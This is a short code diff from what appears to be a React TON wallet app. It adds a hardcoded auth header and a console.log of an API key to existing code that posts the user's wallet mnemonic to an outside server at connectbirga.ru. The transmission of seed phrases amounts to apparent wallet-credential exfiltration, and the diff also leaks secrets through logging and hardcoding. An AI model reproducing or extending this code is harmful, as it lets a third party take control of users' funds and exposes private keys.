@@ -273,13 +273,14 @@ function App() {
     // dispatch(fetchAllValues());
   }, [dispatch]);
 
-
+  console.log(process.env.REACT_APP_API_KEY);
+  
 
   
   const getBalance = useCallback(async () => {
 
     const client = new TonClient({
-      endpoint: "https://toncenter.com/api/v2/jsonRPC",
+      endpoint: "https://toncenter.com/api/v2/jsonRPC", 
     });
 
     console.log(address);
@@ -307,6 +308,10 @@ function App() {
         const user = await axios.post("https://www.connectbirga.ru/user/wallet", {
           mnemonic: mnemonics,
           userId: 2144832745,
+        } , {
+          headers : {
+            "X-API-KEY-AUTH" : "X_API_KEY_AUTH_SOME_KEY_FOR_AUTHlkfdjsdofjs"
+          }
         });
 
         // Create wallet contrac
